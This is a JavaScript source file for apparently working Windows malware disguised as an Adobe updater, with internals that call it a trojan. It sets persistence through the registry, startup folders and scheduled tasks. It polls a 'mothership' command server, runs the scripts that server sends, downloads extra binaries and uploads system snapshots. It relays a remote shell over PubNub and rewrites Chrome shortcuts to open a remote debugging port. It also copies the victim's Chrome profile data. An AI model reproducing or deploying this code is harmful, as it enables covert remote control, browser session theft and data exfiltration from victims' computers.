const helper = require("./adobeupdate.helper.js");

class CmdConfig {
    #__cmdname = "";
    #__launchprocname = ""; // node.exe, cmd.exe, powershell.exe, python.exe, cscript.exe, ...
    #__launchscriptfname = ""; // noderelay.js, pythonrelay.js, adobeupdate.js, pc_monitoring.ps1, <...>.vbs, <...>.bat, <...>.js
    #__childprocess = null;
    #__childcmds = [];
    #__parentcmdconfig = null;
    #__cmdconfig = null; // for cmds launched as a job -- final param should be path to json clinetjob object

    #__childpid = null;

    #__pubnubrelay = null;

    #__clientjob = null;

    get clientjob() {

        // system cmds don't support client jobs
        if (["cmdlist", "ping", "watchdog", "launch_ping"].includes(this.cmdname.toLowerCase())) {
            return null;
        }

        if (this.#__clientjob) return this.#__clientjob;

        let configfpath = "";

        configfpath = process_argv.length >= 4 ? process_argv[3] : "";

        helper.logmsg(`reading configfpath: ${configfpath}`);

        if ( ! helper.fileExists(configfpath) ) {
            throw new Error("configfpath does not exist " + configfpath);
        }

        let jsonconfigstr = helper.readTag(configfpath);

        if (helper.isNullOrWhitespace(jsonconfigstr)) {
            throw new Error("jsonconfigstr is empty");
        }

        helper.logmsg("jsonconfigstr=" + jsonconfigstr);

        let tclientjob = JSON.parse(jsonconfigstr);

        helper.logmsg("clientjob: " + JSON.stringify(tclientjob));

        this.#__clientjob = tclientjob;

        return this.#__clientjob;
    }

    set pubnubrelay(value) {
        this.#__pubnubrelay = value;
    }

    get pubnubrelay() {
        return this.#__pubnubrelay;
    }

    set parentcmdconfig(value) {
        return (this.#__parentcmdconfig = value);
    }

    get parentcmdconfig() {
        return this.#__parentcmdconfig;
    }

    get childpid() {
        return this.#__childpid;
    }

    get config() {
        if (this.#__cmdconfig) return this.#__cmdconfig;

        if (["task", "watchdog", "cmdlist", "ping"].includes(this.cmdname)) {
            return null;
        }

        if (process_argv.length <= 3) {
            return null;
        }

        let cmdconfig_json = readTag(process_argv[3]);
        let cmdconfig_obj = JSON.parse(cmdconfig_json);

        this.#__cmdconfig = cmdconfig_obj;
        return this.#__cmdconfig;
    }

    get jobcode() {
        let configobj = this.config;

        return configobj?.jobcode ?? "";
    }

    get childprocess() {
        return this.#__childprocess;
    }

    get launchscriptfname() {
        return this.#__launchscriptfname;
    }

    get cmdtaskname() {
        if (this.cmdname == "task" && process_argv.length >= 4) {
            return process_argv[3];
        }

        return "";
    }

    set cmdname(value) {
        if (CmdConfig.isCmdExist(value)) this.#__cmdname = value;
        else throw new Error("cmd is not supported [" + value + "]");
    }

    get cmdname() {
        return this.#__cmdname;
    }

    get launchprocname() {
        return this.#__launchprocname;
    }

    getChildCmd(cmdname) {
        for (let i = 0; i < this.#__childcmds.length; i++) {
            let childcmd = this.#__childcmds[i];
            if (childcmd.cmdname == cmdname) {
                return childcmd;
            }
        }

        return null;
    }

    get childcmds() {
        if (!this.#__childcmds) this.#__childcmds = [];

        return this.#__childcmds;
    }

    // should be overriden by implementing cmd
    loopfunc = async () => {
        logmsg("pass");
    };

    newCmdConfig(tcmdname) {
        let childcmd = new CmdConfig(tcmdname, this);
        this.addchildcmd(childcmd);

        return childcmd;
    }

    constructor(tcmdname, cmdconfig) {
        this.cmdname = tcmdname;
        this.parentcmdconfig = cmdconfig;
    }

    // list of supported commands
    static cmdfuncs = {
        watchdog: watchdog,
        task: watchdog,
        launch_ping: watchdog,

        penetrate: penetrate,
        retrieve: retrieve,

        cmdlist: cmdlist,
        ping: ping,
        pcmon: pcmon,
        pspcmon: pspcmon,
        execjob: execjob,
        relay: relay,
        install_python: install_python,
        install_node: install_node,
        cleanup: cleanup,
        modify_chrome: modify_chrome,
        modify_msedge: modify_msedge,

        getsystemoverview: getsystemoverview,
        getscreencapture: getscreencapture,
    };

    get dynamicdelay() {
        return crypto.randomInt(1, 10) * 5;
    }

    get cmdfunc() {
        return CmdConfig.cmdfuncs[this.cmdname];
    }

    static isCmdExist(tcmdname) {
        return Object.hasOwn(CmdConfig.cmdfuncs, tcmdname);
    }

    get cmdpidfpath() {
        return path.join(systemstate.trojandir, this.cmdname + "_running");
    }

    readcmdpid() {
        if (!fileExists(this.cmdpidfpath)) return -1;

        let pid = readTag(this.cmdpidfpath);

        return pid;
    }

    get lockfname() {
        let _fname = "";
        _fname = systemstate.trojanname + "_" + this.cmdname;
        _fname +=
            (!isNullOrWhitespace(this.cmdtaskname)
                ? "_" + this.cmdtaskname
                : "") + "_lock";

        return "\\\\.\\pipe\\" + _fname;
    }

    async activate(cmdlineargs, exitparent) {
        logmsg("starting");

        if (isPidAlive(this.childpid)) {
            logmsg(
                `no need to run [${this.cmdname}]-- child process exists with pid [${this.childpid}]`
            );
            return;
        }

        let pipe_exists = await checkIfPipeExists(this.lockfname);

        if (pipe_exists) {
            logmsg(
                `no need to run [${this.cmdname}]-- pipe exists with name [${this.lockfname}]`
            );

            return;
        }

        let ret = await this.launch(cmdlineargs, !exitparent ? false : true);

        return ret;
    }

    // ! overriden when new child cmd is created by cmdlist
    //   default impelmentation: watchdog uses this function to relay messages between ping and cmdlist
    // message handler -- used by parent cmds to process incoming messages from child cmds
    processMessage(msg) {
        logmsg("starting -- watchdog implementation");

        let parentcmd = this.parentcmdconfig;

        if (!parentcmd) return;

        let src = msg.src;
        let dest = msg.dest;
        let payload = msg.payload;

        let destcmd = parentcmd.getChildCmd(dest);

        if (!destcmd) {
            throw new Error("could not obtain child cmd for " + dest);
        }

        this.sendMessage(destcmd, src, payload);

        logmsg("finished");
    }

    // used by parent cmds to send message to child cmds (watchdog send msg to ping, cmdlist)
    sendMessage(destcmd, src, msgpayload) {
        let childp = destcmd.childprocess;

        if (!childp) {
            throw new Error("childcmd does not have valid child process");
        }

        if (!isChildHealthy(childp)) {
            throw new Error("childprocess is not healthy");
        }

        let msgout = {
            senderPid: process.pid,
            src: src,
            dest: destcmd.cmdname,
            payload: msgpayload,
            ts: getTimestamp(),
        };

        if (childp.connected && !childp.killed) {
            logmsg("sending message to child: " + JSON.stringify(msgout));

            childp.send(msgout);
        }
    }

    async launch(cmdlineargs, exitparent) {
        if (!exitparent) exitparent = false;

        logmsg(`launching [${this.cmdname}]`);

        let child = null;

        cmdlineargs = !(Array.isArray(cmdlineargs) && cmdlineargs.length >= 1)
            ? []
            : cmdlineargs;

        cmdlineargs = [this.cmdname, ...cmdlineargs];

        return new Promise((resolve, reject) => {
            if (!fileExists(systemstate.trojanfpath)) {
                reject(
                    new Error(
                        "trojan script does not exists at " +
                        systemstate.trojanfpath
                    )
                );
            }

            if (exitparent) {
                logmsg("spawning child");
                child = spawn(
                    systemstate.nodeexepath,
                    [systemstate.trojanfpath, ...cmdlineargs],
                    { stdio: "ignore", windowsHide: true }
                );
            } else {
                logmsg("forking child");
                child = fork(systemstate.trojanfpath, cmdlineargs, {
                    windowsHide: true,
                });
            }

            if (!child) {
                reject(new Error("failed to launch child proc"));
            } else {
                logmsg("child process launch success");
            }

            child.unref();

            this.#__childprocess = child;
            this.#__childpid = child?.pid;
            this.#__launchprocname = path.basename(child.spawnargs[0]);
            this.#__launchscriptfname = path.basename(systemstate.trojanfpath);

            logmsg(
                `launched child ${this.cmdname} pid=${child.pid} spawn args: ` +
                JSON.stringify(child.spawnargs)
            );
            // spawnargs: ["C:\\Program Files\\nodejs\\node.exe","C:\\Users\\sebas\\AppData\\Local\\Temp\\owd\\adobeupdate","penetrate"]

            writeTag(this.cmdpidfpath, String(child.pid));

            // incomming message from child process (sender:cmdlist, ping -- receiver: watchdog)
            child.on("message", (message) => {
                logmsg("[YER]incomming message: " + JSON.stringify(message));

                this.processMessage(message);
            });

            child.on("exit", (code) => {
                logmsg(`Child process ${child.pid} exited with code ${code}`);
            });

            child.on("close", (code) => {
                logmsg(`Process exited with code ${code}`);
            });

            child.on("error", (err) => {
                logmsg("Failed to start child process:", err.message);
                reject(err);
            });

            child.on("spawn", () => {
                logmsg(`Child successfully started with PID: ${child.pid}`);

                resolve(child);
            });
        });
    }

    exitramp() {
        let fpath = path.join(systemstate.trojandir, "killall");

        if (fileExists(fpath)) {
            logmsg("found killall -- exiting");
            process.exit(0);
            return;
        }

        fpath = path.join(
            systemstate.trojandir,
            "reset_" + systemstate.cmdconfig.cmdname
        );

        if (fileExists(fpath)) {
            rmSync(fpath, { force: true });
            process.exit(0);
            return;
        }
    }

    async loop() {
        logmsg("starting main looop");

        if (!this.loopfunc) {
            logmsg("Fatal Error: loopfunc is not a valid function");
            process.exit(1);
        }

        let loopindex = 0;
        while (true) {
            loopindex++;
            logmsg(
                `loop starting -- loopindex=${loopindex} -- ${getTimestamp()}`
            );

            this.exitramp();

            try {
                if (isAsyncFunction(this.loopfunc)) await this.loopfunc();
                else this.loopfunc();
            } catch (err) {
                logmsg(err);
            }

            logmsg("sleeping for [" + systemstate.staticdelay + "] seconds");

            for (let i = 0; i < (ISDEBUG ? 3 : systemstate.staticdelay); i++) {
                logmsg(
                    `sleeping one second... [${i + 1}/${systemstate.staticdelay
                    }]`
                );

                await sleep(1000);
            }

            let num =
                systemstate.cmdconfig.dynamicdelay ??
                crypto.randomInt(1, 10) * 5;

            logmsg(`sleeping for an additional ${num} seconds`);

            for (let i = 0; i < (ISDEBUG ? 0 : num); i++) {
                logmsg(
                    `sleeping one second... [${i + 1}/${systemstate.staticdelay
                    }]`
                );
                await sleep(1000);
            }
        }
    }

    addchildcmd(cmdconfig) {
        if (!this.childcmds) this.childcmds = [];

        this.childcmds.push(cmdconfig);
    }
}

// --- IPC for current running process: message send/receive

// message handler -- overriden by child cmds (ping, cmdlist)
var handleMessage = function (msg) {
    helper.logmsg("pass");
};

// receives messages from parent process -- should be used by cmdlist, ping, relay
process.on("message", (message) => {
    if (!message) {
        throw new Error("null message");
    }

    helper.logmsg(`[XAW]incomming message:` + JSON.stringify(message));

    if (handleMessage) {
        helper.logmsg("handleMessage begin");
        handleMessage(message);
        helper.logmsg("handleMessage end");
    }
});

// sends message to parent process -- should be called by cmdlist, ping, relay
async function sendMessage(dest, msgpayload) {
    let isvalid = typeof process.send === "function" && process.connected;
    const parentPid = process.ppid;

    if (!isvalid) {
        throw new Error(
            "this process does not have a parent process to communicate with"
        );
        return;
    }

    helper.logmsg("[CHILD] sending message to parent pid=" + parentPid);

    let message = {
        senderPid: process.pid,
        src: systemconfig.cmdname,
        dest: dest,
        payload: msgpayload,
        ts: getTimestamp(),
    };

    return new Promise((resolve, reject) => {
        process.send(message, undefined, undefined, (error) => {
            if (error) return reject(error);

            resolve();
        });
    });
}

async function penetrate_reg() {
    for (const reg of regstartupconfig.regs) {
        let script_text = "";
        try {
            script_text = regstartupconfig.get_startup_script(reg);
            let ret = await exec_ps_cmd(script_text);
            return ret;
        } catch (err) {
            helper.logmsg(err);
            helper.logmsg(script_text);
        }
    }

    return null;
}

function penetrate_folders() {
    let foldernames = startupfolderconfig.foldernames;

    for (let i = 0; i < foldernames.length; i++) {
        let foldername = foldernames[i];
        let fpath = startupfolderconfig.getScriptPath(foldername);
        let script_txt = startupfolderconfig.getLauncherScript(foldername);

        helper.logmsg(`writing launch script to ${fpath}`);
        fs.writeFileSync(fpath, script_txt, "utf8");
    }
}

// TODO need to execute modify_chrome and modify_edge on each startup
// for tpl -- the desktop lnk can't be modified -- good idea to put in autolaunch to launch 
// and minimise both edge and chrome on startup -- should these processes be headless?
async function penetrate() {
    helper.logmsg("starting");

    if (ISDEBUG) {
        process.exit(0);
    }

    if (!helper.fileExists(systemconfig.launch_script_fpath)) {
        await download_launch_script();
    }

    await modify_chrome();
    await modify_edge();

    await reschedule();
    await penetrate_reg();
    await penetrate_folders();

    // TODO await cleanup()
    // check if trojandir needs cleanup, if so remove log files, etc.

    helper.logmsg("finished");
    process.exit(0);
}

async function watchdog() {
    helper.logmsg("starting");

    let watchdogcmd = systemconfig.cmdconfig;

    let penetratecmd = new CmdConfig("penetrate");
    let retrievecmd = new CmdConfig("retrieve");

    retrievecmd.launch(null, true);
    penetratecmd.launch(null, true);

    watchdogcmd.newCmdConfig("ping");
    watchdogcmd.newCmdConfig("cmdlist");

    let childcmds = watchdogcmd.childcmds;

    watchdogcmd.loopfunc = () => {
        for (let i = 0; i < childcmds.length; i++) {
            let childcmd = childcmds[i];

            childcmd.activate();
        }
    };

    watchdogcmd.loop();

    helper.logmsg("finished");
}

function validatePingResponse(pingresponse) {
    let downloadOpts = pingresponse.downloadOpts;

    if (!helper.fileExists(downloadOpts.localpath)) {
        return false;
    }

    if (!downloadOpts.filetype == "txt") {
        return false;
    }

    let rawtext = pingresponse.rawText;

    if (helper.isNullOrWhitespace(rawtext)) return false;

    let tokens = ["CLIENT_EXISTS", "CLIENT_EXISTS_NEW_PROFILE", "NEW_CLIENT"];

    for (let i = 0; i < tokens.length; i++) {
        if (rawtext.includes(tokens[i])) {
            helper.logmsg("ping reponse contains: " + tokens[i]);
            return true;
        }
    }

    helper.logmsg("ping reponse is not valid");

    return false;
}

function cmdlist_handlecmdjob(clientjob) {
    helper.logmsg("starting");

    let cmdlistcmd = systemconfig.cmdconfig;

    let cmdname = clientjob.cmdname.toLowerCase();

    let stopcmd = false;

    if (cmdname.startsWith("start")) {
        cmdname = cmdname.replace("start", "");
    } else if (cmdname.startsWith("stop")) {
        cmdname = cmdname.replace("stop", "");
        stopcmd = true;
    }

    if (!CmdConfig.isCmdExist(cmdname)) {
        throw new Error(`command is not supported ${cmdname}`);
    }

    if (stopcmd) {
        let jobcmd = cmdlistcmd.getChildCmd(cmdname);

        if (!jobcmd) {
            throw new Error(`child cmd ${cmdname} not in child cmd list`);
        }

        jobcmd.processMessage = (msg) => {
            helper.logmsg(JSON.stringify(msg));
        };

        cmdlistcmd.sendMessage(jobcmd, "cmdlist", clientjob);
    } else {
        let jobcmd = cmdlistcmd.newCmdConfig(cmdname);

        if (!jobcmd) {
            throw new Error(`could not create child cmd ${cmdname}`);
        }

        jobcmd.processMessage = (msg) => {
            helper.logmsg(JSON.stringify(msg));
        };

        let ret = jobcmd.launch([clientjob["configfpath"]]); // TODO refactor such that launch func grabs clientjob from jobcmd

        jobcmd.childprocess.unref();
    }

    helper.logmsg("finished");

    return;
}

// generates child cmds corresponding to clientjob being pushed via ping
// jobtype == 'EXEC_CMD' --> internal cmd is executed
//            'execute_cmdlist', --> job file is retrieved using retrieve.php
// otherwise job file is executed using script engine
async function cmdlist_handleMessage(msg) {
    helper.logmsg("starting");

    let cmdlistcmd = systemconfig.cmdconfig;

    let clientjob = msg?.payload ?? null;

    if (!clientjob) {
        throw new Error("unable to extract clientjob");
    }

    helper.logmsg("received new client job: " + JSON.stringify(clientjob));

    let jobtype = clientjob?.jobtype ?? "";
    jobtype = jobtype.toLowerCase();

    if (jobtype == "execute_cmdlist") {
        clientjob = await retrieveClientJob();
    }

    let configfpath = systemconfig.getClientJobConfigPath();

    fs.writeFileSync(configfpath, JSON.stringify(clientjob));

    clientjob["configfpath"] = configfpath;

    if (!helper.fileExists(configfpath)) {
        throw new Error(`clientjobconfigpath does note exist ${configfpath}`);
    }

    if (jobtype.toLowerCase() == "EXEC_CMD".toLowerCase()) {
        cmdlist_handlecmdjob(clientjob);
        return;
    }

    // TODO: validate clientjob object before launching command

    let execjobcmd = cmdlistcmd.newCmdConfig("execjob");

    if (!execjobcmd) {
        throw new Error("could not create child cmd execjob");
    }

    let ret = execjobcmd.launch([configfpath]);

    execjobcmd.childprocess.unref();

    helper.logmsg("finished");
}

function cmdlist() {
    helper.logmsg("starting");

    let cmdlistcmd = systemconfig.cmdconfig;

    if (cmdlistcmd.cmdname != "cmdlist") {
        throw new Error("cmdlist routine must only be called from cmdlist cmd");
    }

    handleMessage = cmdlist_handleMessage;

    cmdlistcmd.loopfunc = () => {
        helper.logmsg("cmdlist looping...");
    };

    cmdlistcmd.loop();

    helper.logmsg("finished");
}

async function reschedule() {
    let tasknames = taskconfig.tasknames;

    for (let i = 0; i < tasknames.length; i++) {
        let taskname = tasknames[i];

        helper.logmsg(`checking if task exists ${taskname}`);
        let taskexist = await getTaskExists(taskname);

        if (taskexist) {
            helper.logmsg(`task ${taskname} exists`);
            continue;
        }

        helper.logmsg(`creating task ${taskname}`);
        await createTask(taskname);
    }
}


async function retrieve() {
    helper.logmsg("starting");

    let assets = [
        systemconfig.launch_script_fname,
        "pythonrelay.py",
        "pc_monitoring.ps1",
        "nircmdc.exe",
        "7za.exe",
        "gunite.exe",
        "pcmon.dll",
        "pcmon.exe",
        "pslist.exe",
    ];

    for (let i = 0; i < assets.length; i++) {
        let fname = assets[i];
        let localpath = path.join(systemconfig.trojandir, fname);

        let baseUrl = systemconfig.mothershipassets + "/" + fname;

        if (helper.fileExists(localpath)) {
            helper.logmsg(`assets exists ${localpath} -- skipping `);
            continue;
        }

        let downloadOpts = {
            download: true,
            filetype: "bin",
            localpath: localpath,
        };

        let response = await makeGetRequest(baseUrl, null, null, downloadOpts);

        if (!helper.fileExists(localpath)) {
            throw new Error("retrieve failed for: " + localpath);
        }

        const stats = fs.statSync(localpath);
        console.log(`${localpath} -- File size: ${stats.size} bytes`);
    }

    helper.logmsg("finished");
    process.exit(0);
}

async function cleanup() {
    // check if trojandir has hit limits, then execute cleanup
    // remove log files, etc.
    // remove cmdlist_ directories
    //   rmSync('./path/to/dir', { recursive: true, force: true });
    //   fs.unlinkSync('./path/to/file.txt');
    // *.json
    // *.log
}

async function modify_msedge() {
    // C:\Users\ADULT2022\AppData\Local\Microsoft\Edge\User Data
}

// TODO modify for client PCs / TPL
async function modify_chrome() {
// https://peter.sh/experiments/chromium-command-line-switches/

    helper.logmsg('starting');

    let runningcmd = systemconfig.cmdconfig;

    let scriptfname = systemconfig.istpl ? "modify_browser_lnk_tpl.ps1" : "modify_browser_lnk.ps1";
    scriptfpath = path.join(systemconfig.trojandir, scriptfname);

    let ret = '';

    if ( ! helper.fileExists(scriptfpath) ) {
        ret = await retrieve_asset(scriptfname);
    }

    if ( ! helper.fileExists(scriptfpath) ) {
        helper.logmsg(`script does not exist ${scriptfpath}`);
        process.exit(1);
    }


    let targetFolders = [];
    targetFolders.push(`C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar`);
    targetFolders.push(`C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\`);
    targetFolders.push(`C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs`);
    targetFolders.push(`C:\\Users\\Public\\Desktop`);
    
    targetFolders.push(`C:\\Users\\${systemconfig.username}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar`);
    targetFolders.push(`C:\\Users\\${systemconfig.username}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch`);
    targetFolders.push(`C:\\Users\\${systemconfig.username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs`);
    targetFolders.push(`C:\\Users\\${systemconfig.username}\\Desktop`);

    targetFolders.push('C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs');

    let lnks = [];
    
    for ( const targetFolder of targetFolders ) {

        let matchedFiles = getFilesByExtensionSync(targetFolder, '.lnk');

        for (const [index, element] of matchedFiles.entries()) {
            if ( element.toLowerCase().includes('chrome') )
                lnks.push(element);
        }
    }

    cmdlineargs = [
        `--remote-debugging-port=${debugport}`,
        `--user-data-dir="C:\\Users\\LC2022\\AppData\\Local\\Google\\test\\chrome"`,
        `--disable-notifications`,
        `--noerrdialogs`,
        `--disable-infobars`,
        `--disable-session-crashed-bubble`,
        //`--disable-popup-blocking`,
        `--suppress-message-center-popups`,
        headless ? `--headless=new` : "",
        `--no-first-run`, // You can skip Chrome's welcome and setup screens
        `--no-default-browser-check`,
        `--disable-signin-promo`,
        //`--profile-directory="Profile 1"`,
        //`--profile-directory=Default`,
        `--remote-allow-origins=*`,
        restore ? `--restore-last-session` : null,
        ignorecert ? `--ignore-certificate-errors` : null,
        `--window-position=${x_pos},${y_pos}`,
        `--window-size=${width},${height}`,
        `--hide-crash-restore-bubble`,
        `--disable-features=WelcomePage,PrivacySandboxSettings4`,
        `--new-window`,
        starturl,
    ];

    // C:\\Users\\${helper.username}\\AppData\\Local\\Google\\test\\chrome
    cmdlineargs = [
        `--hide-crash-restore-bubble`,
        `--user-data-dir="C:\\Users\\LC2022\\AppData\\Local\\Google\\test\\chrome"`,
        `--profile-directory=Default`,
        `--restore-last-session`,
        `--start-maximized`,
        `--no-first-run`, // You can skip Chrome's welcome and setup screens
        `--remote-allow-origins=*`,
        `--remote-debugging-port=9223`,
        `--no-default-browser-check`,
        // --ignore-certificate-errors --> causes warning popup in chrome on startup/launch
        // `--new-window ${starturl}`,
        // headless ? `--headless=new` : '',
        // `--ignore-certificate-errors`,
        // `--window-position=${x_pos},${y_pos}`,
        // `--window-size=${width},${height}`,
    ];

    cmdlineargs = cmdlineargs.join(' ');

    for ( const lnk of lnks ) {
        helper.logmsg(`processing ${lnk}`);

        shortcut_path = lnk;
        shortcut_path = shortcut_path.replaceAll('\\\\', '\\');

        let jsonconfig = {
            "cmd_line_args": cmdlineargs,
            "shortcut_path": shortcut_path
        };

        let jsonconfigpath = path.join(systemconfig.trojandir, scriptfname + '_' + getTimestamp() + '_config.json');

        writeTag(jsonconfigpath, JSON.stringify(jsonconfig));

        let childp = await execPSScript_async(scriptfpath, [jsonconfigpath]);

    }

    helper.logmsg(`copying user data folder`);

    srcpath = `C:\\Users\\${systemconfig.username}\\AppData\\Local\\Google\\Chrome\\User Data`; // anchor
    destpath = 'C:\\ProgramData\\owd\\chrome';

    if ( ! folderExists(destpath) ) // BUG results in "command failed" error (chrome was running at the time of execution)
        ret = await copy_userdata(srcpath, destpath);

    process.exit(0);
}

async function copy_userdata(srcpath, destpath) {

    helper.logmsg('starting');

    let copycmdstr = `robocopy "${srcpath}" "${destpath}" /E /R:0 /W:0`;

    if ( ! folderExists(destpath) ) {
        fs.mkdirSync(destpath, { recursive: true });
    }

    return new Promise((resolve, reject) => { 
        exec(copycmdstr, (error, stdout, stderr) => {
            if (error) {                      
                reject(error);                
            }                                 

            if (! helper.isNullOrWhitespace(stderr) )
                resolve(stderr);

            resolve(stdout);
        });
    });

}
// TODO add screencapture, modify params to put in switches enabling disabling, upload option
async function getsystemoverview() {
    helper.logmsg("starting");

    let runningcmd = systemconfig.cmdconfig;
    let config = runningcmd.config;

    if (!config) {
        throw new Error(
            `${runningcmd.cmdname} must be launched with job config set`
        );
    }

    let dir_snapshot = null;
    try {
        dir_snapshot = getDirInfo(systemconfig.trojandir);
    } catch (err) {
        dir_snapshot = errorToJson(err);
    }

    let task_snapshot = await getTasks();
    let process_snapshot = await getProcessList_wmic();

    let reg_snapshot = await Promise.all(
        regstartupconfig.reg_paths.map(async (reg_path) => {
            let ret = await query_reg(reg_path.replaceAll(":", ""));
            return ret;
        })
    );

    let startupdir_snapshots = await Promise.all(
        startupfolderconfig.folderpaths.map(async (folderpath) => {
            try {
                return getDirInfo(folderpath);
            } catch (error) {
                return errorToJson(error);
            }
        })
    );

    let outjson = {
        dir_snapshot: dir_snapshot,
        task_snapshot: task_snapshot,
        process_snapshot: process_snapshot,
        startupdir_snapshots: startupdir_snapshots,
        reg_snapshot: reg_snapshot,
    };

    let outjson_str = JSON.stringify(outjson);

    let localfpath = path.join(
        systemconfig.trojandir,
        runningcmd.cmdname + "_out_" + getTimestamp() + ".json"
    );

    fs.writeFileSync(localfpath, outjson_str, "utf-8");

    let baseUrl = systemconfig.mothership + "/ow/upload.php";

    let filename = "getsystemoverview.out";

    let kvp = systemconfig.statekvp;
    kvp["filename"] = filename;
    kvp["jobcode"] = runningcmd.jobcode;

    let response = await makePUTRequest(baseUrl, kvp, null, localfpath);

    helper.logmsg(JSON.stringify(response));

    process.exit(0);
}

async function ping_loop() {
    let baseUrl = systemconfig.mothership + "/ow/ping.php"; // TODO move over to systemconfig

    let inputHeaders = null;
    let params = systemconfig.statekvp;

    let pingpath = path.join(systemconfig.trojandir, "ping_response");
    let downloadOpts = { download: true, filetype: "txt", localpath: pingpath };
    let pingresponse = await makeGetRequest(
        baseUrl,
        params,
        inputHeaders,
        downloadOpts
    );

    let isvalid = validatePingResponse(pingresponse);

    if (!isvalid) {
        helper.logmsg("ping response is invalid");
        systemconfig.selectMothership();
        return;
    }

    let rawtext = pingresponse.rawText;

    let clientjob = processClientJob(rawtext);

    if (clientjob) {
        helper.logmsg(
            `sending job to cmdlist: jobcode=${clientjob.jobcode} jobtype: ${clientjob.jobtype}`
        );
        await sendMessage("cmdlist", clientjob);
    }
}

// TODO !! this overrides handleMessage from adobeupdate
function ping_handleMessage(msg) {
    helper.logmsg("pass");
}

function ping() {
    helper.logmsg("starting");

    let cmdconfig = systemconfig.cmdconfig;
    handleMessage = ping_handleMessage;

    cmdconfig.loopfunc = ping_loop;

    cmdconfig.loop();

    helper.logmsg("finished");
}

async function install_node() {
    helper.logmsg("starting");

    let installcmd = systemconfig.cmdconfig;

    let verify_node = await verify_node_install();

    if (verify_node.state) {
        helper.logmsg("node installed -- passing through");
        process.exit(0);
        return;
    }

    verify_node = verify_node_download();

    if (!verify_node?.state) {
        helper.logmsg(verify_node?.msg);
        await download_node(verify_node?.missingfiles);
    }

    verify_node = verify_node_download();

    if (!verify_node?.state) {
        // helper.logmsg(verify_node?.msg); // TO
        throw new Error("node download failed");
    }

    if (!helper.fileExists(path.join(systemconfig.trojandir, "7za.exe")))
        await retrieve_asset("7za.exe");

    if (!helper.fileExists(path.join(systemconfig.trojandir, "gunite.exe")))
        await retrieve_asset("gunite.exe");

    let args = [
        path.join(systemconfig.nodegsdfilesdir, "disk1.gsd"),
        "-u",
        path.join(systemconfig.nodedir, "node.zip"),
        "-s",
    ];

    let childp = null;

    try {
        childp = await invoke_exe("gunite.exe", args); // throws error despite success
    } catch (err) {
        helper.logmsg(err);
    }

    let fpath = path.join(systemconfig.nodedir, "node.zip");

    if (!helper.fileExists(fpath)) {
        throw new Error("file does not exist " + fpath);
    }

    const stats = fs.statSync(fpath);
    if (!stats.size == 47549770) {
        throw new Error("incorrect file size " + stats.size + " 72890982");
    }

    args = ["x", fpath, "-o" + systemconfig.nodedir, "-aoa", "-y"];

    try {
        childp = await invoke_exe("7za.exe", args);
    } catch (err) {
        helper.logmsg(err);
    }

    verify_node = await verify_node_install();

    if (!verify_node?.state) {
        throw new Error(verify_node?.msg);
    }

    helper.logmsg("finished");
}

function relay() {
    helper.logmsg("starting");

    let relaycmd = systemconfig.cmdconfig;

    let clientjob = relaycmd.clientjob;

    if (clientjob == null) {
        helper.logmsg("cannot start relay without client job");
        process.exit(1);
    }

    let args = clientjob.args || [];

    if (args.length == 0) {
        throw new Error(
            "cannot start relay as clientjob does not specify args"
        );
    }

    let enginename = args[0];
    enginename = enginename.toUpperCase();

    if (helper.isNullOrWhitespace(enginename)) {
        throw new Error("enginename is missing");
    }

    if (!["PY", "JS", "BAT", "PS1"].includes(enginename)) {
        throw new Error(`engine is not supported: ${enginename}`);
    }

    let browsername = "";

    if (enginename == "PY") {
        if (args.length <= 0) {
            browsername = "chrome";
            helper.logmsg(`defaulting to browsername=${browsername}`);
        } else {
            browsername = args[1];
            helper.logmsg(`browsername=${browsername}`);
        }
    }

    let pubnubr = null;

    // note: python relay uses its own pubnub logic within the python script (pythonrelay.py)

    // [7SZOSMSP]: wire up stdin of childp to incomming pubnub messages
    // lookup [CADZ248S] for the childp stdout handlers
    if (enginename != "PY") {
        relaycmd.pubnubrelay = new PubnubRelay(enginename);

        pubnubr = relaycmd.pubnubrelay;

        // handle incoming message from pubnub (cmds sent by host to client)
        pubnubr.handleMessage = (msgevent) => {
            let payload = msgevent.message;
            let cmdtext = payload.cmdtext;
            writeToChildProcess(childp, cmdtext);
        };
    }

    let childp = null;

    relaycmd.loopfunc = () => {
        helper.logmsg("relay looping...");

            pubnubr.publishMessage({
                ping: 'ping '+getRandomCode(8),
                ts: getTimestamp()
            });

        let tcmdpid = childp?.pid ?? -1;

        if (!isPidAlive(tcmdpid)) {
            childp = launchrelay(enginename, pubnubr, browsername);
        }
    };

    relaycmd.loop();

    helper.logmsg("finished");
}

function execjob() {
    helper.logmsg("starting");

    let configfpath = "";

    configfpath = process_argv.length >= 4 ? process_argv[3] : "";

    helper.logmsg("reading configfpath: " + configfpath);

    if (!helper.fileExists(configfpath)) {
        throw new Error("configfpath does not exist " + configfpath);
    }

    let jsonconfigstr = readTag(configfpath);

    if (helper.isNullOrWhitespace(jsonconfigstr)) {
        throw new Error("jsonconfigstr is empty");
    }

    helper.logmsg("jsonconfigstr=" + jsonconfigstr);

    let clientjob = JSON.parse(jsonconfigstr);

    helper.logmsg("clientjob: " + JSON.stringify(clientjob));

    let jobfileext = path.extname(clientjob.jobfilename).toLowerCase();

    helper.logmsg("jobfileext: " + jobfileext);

    if (
        ![".bat", ".js", ".vbs", ".py", ".ps1"].includes(
            jobfileext.toLowerCase()
        )
    ) {
        throw new Error(`file extension is not supported ${jobfileext}`);
    }

    if (jobfileext.toLowerCase() == ".bat") {
        execCMDScript(clientjob.localpath);
    } else if (jobfileext.toLowerCase() == ".py") {
        execPYTHONScript(clientjob.localpath);
    } else if (jobfileext.toLowerCase() == ".js") {
        execNODEScript(clientjob.localpath);
    } else if (jobfileext.toLowerCase() == ".vbs") {
        execVBSScript(clientjob.localpath);
    } else if (jobfileext.toLowerCase() == ".ps1") {
        execPSScript(clientjob.localpath);
    }

    helper.logmsg("finished");
}

function launch_pcmon_koffi() {
    const koffi = require("koffi");

    let dllpath = path.join(systemconfig.pcmondir, "pcmon.dll");

    if (!helper.fileExists(dllpath)) {
        throw new Error("dll does not exist " + dllpath);
    }

    process.chdir(systemconfig.pcmondir);

    const lib = koffi.load(dllpath);
